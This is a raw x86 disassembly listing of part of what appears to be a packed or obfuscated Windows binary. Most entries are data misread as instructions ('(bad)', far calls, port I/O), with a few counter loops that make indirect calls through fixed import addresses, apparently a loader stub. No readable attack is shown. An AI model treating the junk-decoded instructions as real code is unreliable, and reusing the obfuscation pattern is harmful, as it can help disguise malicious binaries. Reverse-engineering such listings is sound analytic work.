  409bac:	mov    esi,0x7979d032
  409bb1:	cmp    DWORD PTR [ebx-0x591fd80b],edi
  409bb7:	repz (bad)
  409bba:	ja     0x409b80
  409bbc:	cmp    al,0xb1
  409bbe:	pop    ebp
  409bbf:	iret   
  409bc0:	cdq    
  409bc1:	mov    eax,ds:0x5fbcb72b
  409bc6:	mov    esp,DWORD PTR [ecx]
  409bc8:	fld    QWORD PTR [ecx+0x216bce8d]
  409bce:	sub    eax,0xd707183c
  409bd3:	gs ret 0x2e90
  409bd7:	fld    DWORD PTR [edx-0x16c87a2]
  409bdd:	shl    BYTE PTR [ebp+0x5f970647],0xb0
  409be4:	ret    
  409be5:	call   0x9797:0xed20c364
  409bec:	in     eax,dx
  409bed:	inc    esi
  409bee:	dec    eax
  409bef:	push   0xa
  409bf1:	xchg   esi,eax
  409bf2:	jae    0x409c2e
  409bf4:	aam    0x7a
  409bf6:	dec    esi
  409bf7:	repz fs out dx,al
  409bfa:	sub    dl,al
  409bfc:	jmp    0x409c49
  409bfe:	inc    esp
  409bff:	pop    edx
  409c00:	mov    cl,0x28
  409c02:	cdq    
  409c03:	xor    ecx,DWORD PTR [eax+0x7f978c73]
  409c09:	pop    eax
  409c0a:	xchg   ecx,eax
  409c0b:	fwait
  409c0c:	mov    edi,0x58e44307
  409c11:	push   0xffffffc5
  409c13:	iret   
  409c14:	xor    edi,DWORD PTR [ecx+0x7a3839b3]
  409c1a:	popf   
  409c1b:	and    ecx,edi
  409c1d:	push   ebx
  409c1e:	test   BYTE PTR [edx],bl
  409c20:	lock mov dh,0x53
  409c23:	popf   
  409c24:	mov    ah,0x6f
  409c26:	mov    esp,0x73e1d6c3
  409c2b:	fcom   st(7)
  409c2d:	pop    edi
  409c2e:	xchg   ebp,eax
  409c2f:	(bad)  
  409c30:	retf   
  409c31:	sbb    eax,0x2b761382
  409c36:	addr16 shl bh,1
  409c39:	cwde   
  409c3a:	xchg   ebp,eax
  409c3b:	sbb    eax,0x73237bae
  409c40:	and    eax,0x6b1a1e9
  409c45:	inc    ebp
  409c46:	in     eax,0x2f
  409c48:	fstp   DWORD PTR [edx-0x7c]
  409c4b:	mov    BYTE PTR [ecx-0x79],bh
  409c4e:	inc    eax
  409c4f:	dec    edi
  409c50:	and    cl,ah
  409c52:	and    BYTE PTR [edi],dh
  409c54:	test   al,0xf4
  409c56:	fistp  QWORD PTR ds:0x9e811192
  409c5c:	mov    esp,esp
  409c5e:	retf   0x3833
  409c61:	cs mov edi,0xb5f3eb6b
  409c67:	push   ss
  409c68:	(bad)  
  409c6a:	adc    ecx,esi
  409c6c:	or     bl,dh
  409c6e:	adc    eax,0xf40d89f0
  409c73:	sti    
  409c74:	js     0x409c6d
  409c76:	fsub   DWORD PTR ds:0x5885cb09
  409c7c:	imul   eax,DWORD PTR [ebx],0x930c55bf
  409c82:	mov    ds:0x23372bc5,eax
  409c87:	enter  0x2a97,0x73
  409c8b:	je     0x409d06
  409c8d:	or     dh,cl
  409c8f:	jbe    0x409c80
  409c91:	cpuid  
  409c93:	mov    ecx,ebp
  409c95:	and    BYTE PTR [eax-0x24],al
  409c98:	push   edi
  409c99:	cld    
  409c9a:	iret   
  409c9b:	into   
  409c9c:	fs leave 
  409c9e:	jns    0x409c9e
  409ca0:	stos   BYTE PTR es:[edi],al
  409ca1:	test   BYTE PTR [esi-0x6e],ch
  409ca4:	test   eax,0xffba356e
  409ca9:	jp     0x409d06
  409cab:	loope  0x409c8e
  409cad:	cmp    bl,BYTE PTR [ebx+0x1a203f05]
  409cb3:	adc    DWORD PTR [esi-0x43cdbef6],ebp
  409cb9:	push   edi
  409cba:	ja     0x409c3e
  409cbc:	aaa    
  409cbd:	rcr    DWORD PTR [edi],0xc5
  409cc0:	lea    esp,[ecx-0x1e]
  409cc3:	js     0x409d21
  409cc5:	mov    al,0x1e
  409cc7:	dec    esi
  409cc8:	das    
  409cc9:	and    dh,BYTE PTR [ebx-0x199f5994]
  409ccf:	sub    eax,0xd9d3cc6
  409cd4:	imul   ebx,DWORD PTR [edi+0x51],0x82ce10ab
  409cdb:	mov    ah,0xb0
  409cdd:	hlt    
  409cde:	(bad)  
  409cdf:	jno    0x409d2e
  409ce1:	mov    edx,0xe5b1c884
  409ce6:	pop    esi
  409ce7:	mov    al,ds:0xe7daf21b
  409cec:	jl     0x409d32
  409cee:	test   BYTE PTR [eax+0xa],al
  409cf1:	retf   0xb81c
  409cf4:	mov    ds:0x269ebd97,al
  409cf9:	cmc    
  409cfa:	ins    BYTE PTR es:[edi],dx
  409cfb:	pop    ebx
  409cfc:	xchg   esi,eax
  409cfd:	call   0x7ff54682
  409d02:	out    dx,eax
  409d03:	call   0x695f:0x68afac32
  409d0a:	cwde   
  409d0b:	xchg   BYTE PTR [esi],al
  409d0d:	add    eax,0xf145b1f2
  409d12:	js     0x409d69
  409d14:	jbe    0x409d0d
  409d16:	std    
  409d17:	mov    WORD PTR [esi],?
  409d19:	cmp    al,BYTE PTR [edi]
  409d1b:	cmp    esi,DWORD PTR ds:0x59daf041
  409d21:	mov    DWORD PTR [esi-0x5063b25e],ecx
  409d27:	push   esi
  409d28:	call   0xc57bda9f
  409d2d:	repnz and DWORD PTR [esp+edi*1+0x61e3bc58],ebp
  409d35:	call   eax
  409d37:	sbb    DWORD PTR [edx-0xc],esp
  409d3a:	xor    DWORD PTR ds:0x67cb7e47,0x39
  409d41:	add    bl,dh
  409d43:	sub    DWORD PTR [esi+0x57],0x67
  409d47:	sub    eax,0xff40c466
  409d4c:	mov    al,0x74
  409d4e:	add    al,0xce
  409d50:	xchg   esp,eax
  409d51:	enter  0xccf8,0x21
  409d55:	add    al,0xc
  409d57:	pusha  
  409d58:	aas    
  409d59:	sbb    eax,0x573f4bec
  409d5e:	rcr    BYTE PTR [ecx+0x56],0xbd
  409d62:	scas   eax,DWORD PTR es:[edi]
  409d63:	mov    cl,0x14
  409d65:	jb     0x409d57
  409d67:	or     esp,0xffffffc4
  409d6a:	sbb    ebx,DWORD PTR [eax]
  409d6c:	add    eax,ebx
  409d6e:	inc    edx
  409d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d70:	mov    dl,0x33
  409d72:	or     bh,BYTE PTR [edi]
  409d74:	(bad)  
  409d76:	imul   ebp,DWORD PTR [ecx+0x5d9eaa3a],0x5af9b6dc
  409d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433617,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	lahf   
  409dbf:	xor    ah,ah
  409dc1:	jge    0x409dfb
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409dad
  409dcb:	cmp    DWORD PTR [ecx+0x40],0x38af9ec2
  409dd2:	shl    DWORD PTR [edi-0x4c96bffe],cl
  409dd8:	(bad)  
  409dd9:	pop    esp
  409dda:	imul   edx,DWORD PTR [eax],0xffffffde
  409ddd:	retf   
  409dde:	(bad)  [ebp-0x2f211af0]
  409de4:	minps  xmm3,XMMWORD PTR [esi+0x48567650]
  409deb:	add    al,0xcf
  409ded:	(bad)  
  409dee:	cli    
  409def:	sbb    ch,BYTE PTR [ebx]
  409df1:	pushf  
  409df2:	and    ecx,DWORD PTR [esi-0x4099de31]
  409df8:	or     ecx,DWORD PTR [ecx-0x68]
  409dfb:	adc    BYTE PTR [eax-0x3c77cd90],al
  409e01:	adc    ebx,DWORD PTR [ebp-0x39]
  409e04:	and    eax,0xe46d92ba
  409e09:	test   cl,cl
  409e0b:	push   0x60699b2e
  409e10:	in     al,dx
  409e11:	and    DWORD PTR [eax],ebp
  409e13:	cmp    BYTE PTR [ecx-0x49],cl
  409e16:	pop    eax
  409e17:	push   0xe44e32c5
  409e1c:	enter  0xc5c9,0x9f
  409e20:	push   0xffffffec
  409e22:	js     0x409e2b
  409e24:	xchg   edx,eax
  409e25:	adc    ecx,DWORD PTR [eax+0x51]
  409e28:	arpl   WORD PTR [edi],di
  409e2a:	pop    es
  409e2b:	inc    DWORD PTR ds:0x2988b38b
  409e31:	jp     0x409dc7
  409e33:	es popf 
  409e35:	xor    BYTE PTR [bp+di-0x17],dh
  409e39:	push   esp
  409e3a:	lock xchg ebp,eax
  409e3c:	mov    edx,0x7d8b4e33
  409e41:	ins    DWORD PTR es:[edi],dx
  409e42:	rcl    dh,cl
  409e44:	leave  
  409e45:	pop    edi
  409e46:	pop    esp
  409e47:	scas   eax,DWORD PTR es:[edi]
  409e48:	pop    es
  409e49:	retf   0x308c
  409e4c:	sbb    DWORD PTR [esi+ebp*1-0x10],ebp
  409e50:	adc    al,0xe9
  409e52:	pop    ebp
  409e53:	jl     0x409ec8
  409e55:	shr    al,1
  409e57:	pop    edx
  409e58:	xor    ch,BYTE PTR [esi]
  409e5a:	pushf  
  409e5b:	sahf   
  409e5c:	or     DWORD PTR [ebp+0x61],esi
  409e5f:	mov    ah,0x36
  409e61:	icebp  
  409e62:	(bad)  
  409e63:	(bad)  
  409e64:	cmp    edx,ecx
  409e66:	push   0x942e6c58
  409e6b:	pop    ebx
  409e6c:	(bad)  
  409e6d:	loope  0x409ea5
  409e6f:	pop    ecx
  409e70:	test   eax,0xf9f8aef0
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	pop    esp
  409e77:	fstp   QWORD PTR [edi-0x35466aeb]
  409e7d:	mov    ch,0x19
  409e7f:	xlat   BYTE PTR fs:[ebx]
  409e81:	sbb    dl,BYTE PTR [esi-0x6a92776c]
  409e87:	pop    ds
  409e88:	inc    esi
  409e89:	bound  ebp,QWORD PTR [edi-0x70bd9ac4]
  409e8f:	adc    al,0xba
  409e91:	and    DWORD PTR [edx-0x6],eax
  409e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e95:	shl    DWORD PTR [edx-0x68],cl
  409e98:	push   esp
  409e99:	and    al,BYTE PTR [ebx+ebp*1-0x7b1053db]
  409ea0:	cmp    ebx,DWORD PTR [edx+0x5216c677]
  409ea6:	and    bh,BYTE PTR [ebx-0x31]
  409ea9:	pop    ss
  409eaa:	in     eax,0xca
  409eac:	xchg   edx,eax
  409ead:	scas   al,BYTE PTR es:[edi]
  409eae:	aas    
  409eaf:	rol    BYTE PTR [ebp-0x11],cl
  409eb2:	adc    al,0x22
  409eb4:	and    al,0xc7
  409eb6:	mov    eax,ds:0x4ea700b7
  409ebb:	and    esi,edx
  409ebd:	lea    ax,[edx]
  409ec0:	pop    eax
  409ec1:	mov    esp,0x4922aade
  409ec6:	lds    eax,FWORD PTR [edi+edx*1]
  409ec9:	fist   DWORD PTR [ebx+0x7d]
  409ecc:	fucom  st(0)
  409ece:	mov    edi,edx
  409ed0:	xor    DWORD PTR [eax+0x2741840e],0xe2a64e71
  409eda:	jmp    0x409eb7
  409edc:	fisttp QWORD PTR [ebx-0x606b292e]
  409ee2:	test   DWORD PTR [esi],ecx
  409ee4:	sub    al,0x6b
  409ee6:	mov    cl,0xae
  409ee8:	adc    al,ah
  409eea:	fs retf 0xea05
  409eee:	int3   
  409eef:	sbb    ebx,DWORD PTR [ebx+ebx*8+0x576868a9]
  409ef6:	mul    DWORD PTR [ecx]
  409ef8:	mov    DWORD PTR [ecx],ebp
  409efa:	dec    ebx
  409efb:	test   eax,0xcb646bdb
  409f00:	jle    0x409ebc
  409f02:	test   al,0x29
  409f04:	push   0x67
  409f06:	daa    
  409f07:	fistp  WORD PTR [ecx+eax*4-0xb5a8e33]
  409f0e:	fmul   DWORD PTR [eax+0x6e]
  409f11:	sub    DWORD PTR [ebx+0x61ac7d98],ecx
  409f17:	fiadd  WORD PTR [esi]
  409f19:	test   DWORD PTR [ecx-0x45],edi
  409f1c:	add    DWORD PTR [ecx+eax*1-0x5b],eax
  409f20:	adc    dh,ch
  409f22:	shl    DWORD PTR [edx-0x59944a13],1
  409f28:	xor    ebp,DWORD PTR [esi-0x1fe420b9]
  409f2e:	cmc    
  409f2f:	push   ecx
  409f30:	pop    esi
  409f31:	sub    BYTE PTR [ecx+0x44161e13],ch
  409f37:	push   0x2b7d1281
  409f3c:	push   0xbff1b4fd
  409f41:	test   BYTE PTR [esi+eiz*1-0x77a5bcad],bl
  409f48:	aam    0x98
  409f4a:	cwde   
  409f4b:	ret    
  409f4c:	mov    bl,BYTE PTR [eax]
  409f4e:	cld    
  409f4f:	lahf   
  409f50:	xchg   esp,eax
  409f51:	pop    esp
  409f52:	out    dx,eax
  409f53:	push   edx
  409f54:	cmc    
  409f55:	mov    ds:0xf39f767d,eax
  409f5a:	fsub   DWORD PTR [edi+ecx*2+0x17]
  409f5e:	inc    ebp
  409f5f:	mov    gs,WORD PTR [ebx+0x17d0a238]
  409f65:	leave  
  409f66:	(bad)
  409f6a:	jno    0x409fd7
  409f6c:	call   0xa007:0x951facd7
  409f73:	mov    bh,0xd1
  409f75:	jp     0x409fe8
  409f77:	xor    DWORD PTR ds:0x14e43527,0x885dda5c
  409f81:	jg     0x409f9c
  409f83:	jecxz  0x409f75
  409f85:	push   ss
  409f86:	sub    BYTE PTR [edx-0x62c7b207],0x26
  409f8d:	push   edi
  409f8e:	xchg   esi,eax
  409f8f:	jbe    0x409f54
  409f91:	rcr    eax,0x83
  409f94:	xor    bl,BYTE PTR [ebp+0x30]
  409f97:	or     al,0xd9
  409f99:	xchg   ebp,eax
  409f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f9b:	mov    ds:0x74044119,al
  409fa0:	xchg   edi,eax
  409fa1:	pop    ebx
  409fa2:	inc    eax
  409fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fa4:	dec    ebp
  409fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fa6:	pop    esi
  409fa7:	pushf  
  409fa8:	push   edi
  409fa9:	ret    0xb0ba
  409fac:	jo     0x40a012
  409fae:	rol    DWORD PTR [ecx+0x2b1059ff],0x1a
  409fb5:	gs inc esi
  409fb7:	and    eax,0x3e61ce26
  409fbc:	mov    WORD PTR [esi],?
  409fbe:	ret    
  409fbf:	clc    
  409fc0:	das    
  409fc1:	pop    ebx
  409fc2:	cmp    al,bh
  409fc4:	daa    
  409fc5:	mov    ebp,0x3a684584
  409fca:	and    eax,0x255d4124
  409fcf:	xor    ebp,ebx
  409fd1:	fcmovu st,st(0)
  409fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd4:	push   ebx
  409fd5:	adc    al,0x8f
  409fd7:	inc    esp
  409fd8:	mul    DWORD PTR [esi]
  409fda:	xchg   DWORD PTR [ebx],ebp
  409fdc:	stos   DWORD PTR es:[edi],eax
  409fdd:	shl    BYTE PTR [ebx+0x12],cl
  409fe0:	fwait
  409fe1:	out    0x52,al
  409fe3:	jae    0x409ff0
  409fe5:	mov    edx,0x9e687cba
  409fea:	cwde   
  409feb:	iret   
  409fec:	outs   dx,DWORD PTR ds:[esi]
  409fed:	inc    esi
  409fee:	jecxz  0x40a02a
  409ff0:	push   eax
  409ff1:	dec    ebx
  409ff2:	sub    dl,BYTE PTR [eax+esi*2]
  409ff5:	sub    BYTE PTR [esi-0x64],bh
  409ff8:	adc    eax,0xfaa75520
  409ffd:	ficom  DWORD PTR [ecx]
  409fff:	adc    eax,0xe07db20
  40a004:	push   ss
  40a005:	add    esp,0xfffffff6
  40a008:	sar    BYTE PTR [ebx+0x2129bb5c],1
  40a00e:	int    0x70
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a127:	fdiv   QWORD PTR [ebx+esi*4]
  40a12a:	and    al,0x7e
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a150
  40a133:	adc    edi,eax
  40a135:	rcr    BYTE PTR [edx],cl
  40a137:	test   BYTE PTR [ebx],ch
  40a139:	dec    ebx
  40a13a:	imul   ecx,DWORD PTR ds:0xc79f9f6f,0x37
  40a141:	icebp  
  40a142:	imul   edx,DWORD PTR [edx],0x3f477b5f
  40a148:	mov    ds:0xca1aa05,eax
  40a14d:	inc    ebp
  40a14e:	dec    edi
  40a14f:	and    eax,0x9dd27c6f
  40a154:	inc    esp
  40a155:	add    DWORD PTR [ebx-0x3d592c30],eax
  40a15b:	sbb    eax,0x2e56d625
  40a160:	sub    cl,0xa2
  40a163:	shl    DWORD PTR [ebx],cl
  40a165:	rcl    BYTE PTR [ecx-0x11],1
  40a168:	push   es
  40a169:	(bad)  
  40a16a:	stos   DWORD PTR es:[edi],eax
  40a16b:	mov    edi,0x772dd40f
  40a170:	dec    ebx
  40a172:	stos   DWORD PTR es:[edi],eax
  40a173:	loopne 0x40a143
  40a175:	ja     0x40a17d
  40a177:	mov    bl,0xb1
  40a179:	cmp    cl,BYTE PTR [edi-0x305e73a1]
  40a17f:	fld    TBYTE PTR [ebp+ebp*2-0x15]
  40a183:	repz ret 
  40a185:	in     al,dx
  40a186:	or     eax,0x2458d85c
  40a18b:	xchg   BYTE PTR [edi],cl
  40a18d:	sbb    BYTE PTR [ecx+ecx*8-0x1c18bd13],al
  40a194:	dec    eax
  40a195:	mov    edi,0xeaf836bc
  40a19a:	dec    esp
  40a19b:	xchg   ecx,eax
  40a19c:	add    BYTE PTR [eax],bh
  40a19e:	mov    esi,0x6e04ec07
  40a1a3:	jno    0x40a1a7
  40a1a5:	arpl   sp,sp
  40a1a7:	ficomp WORD PTR [edx+0x3d7c159e]
  40a1ad:	(bad)  
  40a1ae:	les    edi,FWORD PTR [edi+0x75435b8a]
  40a1b4:	jbe    0x40a1de
  40a1b6:	(bad)  
  40a1b7:	out    0xb5,eax
  40a1b9:	cmp    DWORD PTR [ebp-0x195e3bb4],ecx
  40a1bf:	jbe    0x40a1a7
  40a1c1:	jp     0x40a226
  40a1c3:	retf   0x6df3
  40a1c6:	jnp    0x40a189
  40a1c8:	adc    esi,ecx
  40a1ca:	push   es
  40a1cb:	push   ecx
  40a1cc:	pop    ds
  40a1cd:	cmc    
  40a1ce:	sub    BYTE PTR [eax-0x45a53bfe],cl
  40a1d4:	xchg   edi,eax
  40a1d5:	mov    dl,0xcf
  40a1d7:	mov    dl,0x3
  40a1d9:	gs jg  0x40a17d
  40a1dc:	rcl    DWORD PTR [ebx+esi*2-0x2a879b81],1
  40a1e3:	sti    
  40a1e4:	mov    ecx,0xee4216e2
  40a1e9:	imul   DWORD PTR [ecx-0x5943eaf7]
  40a1ef:	push   0x1b5b23c9
  40a1f4:	(bad)  
  40a1f5:	cmc    
  40a1f6:	in     al,dx
  40a1f7:	cmp    al,BYTE PTR [ebp+0x3ce6d428]
  40a1fd:	scas   al,BYTE PTR es:[di]
  40a1ff:	mov    dl,0x8a
  40a201:	cmp    ebx,DWORD PTR [ebx-0x5a117e9a]
  40a207:	jnp    0x40a1ec
  40a209:	inc    edx
  40a20a:	in     eax,dx
  40a20b:	mov    bh,0x8
  40a20d:	dec    eax
  40a20e:	jl     0x40a195
  40a210:	sub    edi,DWORD PTR [edi]
  40a212:	sub    eax,0x231eb25
  40a217:	popa   
  40a218:	sub    al,0x9d
  40a21a:	fdivr  st,st(7)
  40a21c:	(bad)  
  40a21d:	pusha  
  40a21e:	(bad)  
  40a21f:	pop    edi
  40a220:	lea    edx,[ebx-0x7d]
  40a223:	dec    esp
  40a224:	mov    ah,0x52
  40a226:	mov    ebp,0x7f12ade6
  40a22b:	jge    0x40a1bc
  40a22d:	ds mov cs,ebp
  40a230:	jbe    0x40a26a
  40a232:	retf   0x6a2e
  40a235:	in     eax,dx
  40a236:	(bad)  
  40a238:	rcl    DWORD PTR [edx+0x1fffe492],cl
  40a23e:	aad    0x57
  40a240:	lods   al,BYTE PTR ds:[esi]
  40a241:	mov    ds:0xc625f6b7,eax
  40a246:	aas    
  40a247:	js     0x40a27a
  40a249:	test   DWORD PTR ds:0x9747ab06,ebx
  40a24f:	push   cs
  40a250:	push   ebp
  40a251:	aad    0x48
  40a253:	out    dx,al
  40a254:	pop    ds
  40a255:	sbb    bh,BYTE PTR [edx-0x54]
  40a258:	popf   
  40a259:	mov    ebx,0x350f8c83
  40a25e:	jo     0x40a1fd
  40a260:	sbb    ebx,ecx
  40a262:	loop   0x40a2bc
  40a264:	rol    BYTE PTR [ebp+0x1627d2ad],cl
  40a26a:	sbb    eax,0xe3af1da5
  40a26f:	rol    DWORD PTR [ecx],1
  40a271:	adc    dl,al
  40a273:	leave  
  40a274:	and    dl,bl
  40a276:	(bad)  
  40a277:	hlt    
  40a278:	push   0x3ac34678
  40a27d:	out    0x7b,al
  40a27f:	jmp    0x40a2c8
  40a281:	dec    edx
  40a282:	mov    ds:0x866d582e,al
  40a287:	jl     0x40a2dd
  40a289:	std    
  40a28a:	jne    0x40a2ff
  40a28c:	adc    BYTE PTR [eax],dh
  40a28e:	out    0x7b,eax
  40a290:	xchg   ecx,eax
  40a291:	add    dl,ch
  40a293:	and    dl,BYTE PTR [bx]
  40a296:	rol    DWORD PTR [ecx],1
  40a298:	push   ecx
  40a299:	jmp    0x40a2a3
  40a29b:	jns    0x40a22d
  40a29d:	out    0x6e,al
  40a29f:	je     0x40a2e3
  40a2a1:	jne    0x40a284
  40a2a3:	mov    bh,0xce
  40a2a5:	inc    ebp
  40a2a6:	push   ebx
  40a2a7:	cmc    
  40a2a8:	jge    0x40a268
  40a2aa:	loopne 0x40a277
  40a2ac:	ss pop eax
  40a2ae:	test   DWORD PTR [ebp-0x48327bc3],edx
  40a2b4:	or     DWORD PTR [eax],0x2c5e725d
  40a2ba:	push   ss
  40a2bb:	cmp    DWORD PTR [esi-0x5f6018b4],ebx
  40a2c1:	ds aas 
  40a2c3:	hlt    
  40a2c4:	add    BYTE PTR [esi+0x25],bl
  40a2c7:	fisubr DWORD PTR [ecx]
  40a2c9:	pop    eax
  40a2ca:	in     al,dx
  40a2cb:	test   BYTE PTR [eax-0x6b],ah
  40a2ce:	xlat   BYTE PTR ds:[ebx]
  40a2cf:	mov    ds:0x7b6a6c1b,eax
  40a2d4:	ret    
  40a2d5:	lods   al,BYTE PTR ds:[esi]
  40a2d6:	sub    al,0x77
  40a2d8:	xchg   esp,eax
  40a2d9:	iret   
  40a2da:	std    
  40a2db:	rol    ch,0x44
  40a2de:	add    BYTE PTR [edx+0x14423842],bh
  40a2e4:	ja     0x40a30f
  40a2e6:	push   cs
  40a2e7:	push   edx
  40a2e8:	cmp    DWORD PTR [ecx-0x4f],eax
  40a2eb:	fadd   QWORD PTR [ebx+0x7a]
  40a2ee:	outs   dx,BYTE PTR ds:[esi]
  40a2ef:	ficomp DWORD PTR [edi+edi*4-0x5b7c0caa]
  40a2f6:	jecxz  0x40a361
  40a2f8:	add    BYTE PTR [ecx-0xd],0xd3
  40a2fc:	nop
  40a2fd:	sbb    DWORD PTR [edi],edx
  40a2ff:	call   0x31f552d5
  40a304:	jb     0x40a313
  40a306:	sbb    dl,BYTE PTR [edi+0x74abb72a]
  40a30c:	xor    edx,ebp
  40a30e:	or     bh,BYTE PTR [esi+esi*2-0x19]
  40a312:	mov    dh,0x62
  40a314:	mov    ecx,0xbd4ebdaa
  40a319:	(bad)  
  40a31a:	push   eax
  40a31b:	sbb    dh,bh
  40a31d:	pop    ebx
  40a31e:	shr    DWORD PTR [ecx-0x5e],cl
  40a321:	and    DWORD PTR [ebx-0x19ad6f47],ebp
  40a327:	push   ss
  40a328:	icebp  
  40a329:	test   al,0x1d
  40a32b:	pop    esp
  40a32c:	leave  
  40a32d:	cwde   
  40a32e:	inc    ecx
  40a32f:	pop    ss
  40a330:	sbb    ebp,DWORD PTR es:[ecx-0x57]
  40a334:	rol    al,0x12
  40a337:	pop    edx
  40a338:	cmc    
  40a339:	jno    0x40a3b9
  40a33b:	xor    BYTE PTR [ecx+0x2a],al
  40a33e:	scas   eax,DWORD PTR es:[edi]
  40a33f:	xchg   esi,ebx
  40a341:	cmc    
  40a342:	sbb    al,0xa5
  40a344:	mov    ds:0xc4de4617,eax
  40a349:	test   al,0xfb
  40a34b:	out    0x58,al
  40a34d:	test   eax,0x55aaa0f7
  40a352:	test   eax,0x98d7481e
  40a357:	daa    
  40a358:	add    BYTE PTR [ebx],0xcd
  40a35b:	fdivr  QWORD PTR [edx]
  40a35d:	and    eax,0x6341aa4c
  40a362:	and    bh,BYTE PTR [edx+0x116d7520]
  40a368:	inc    edi
  40a369:	mov    edx,0x172b0ac6
  40a36e:	or     al,0xa7
  40a370:	cmp    DWORD PTR [ebx+0x518d3ef3],eax
  40a376:	and    edx,edx
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4335fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
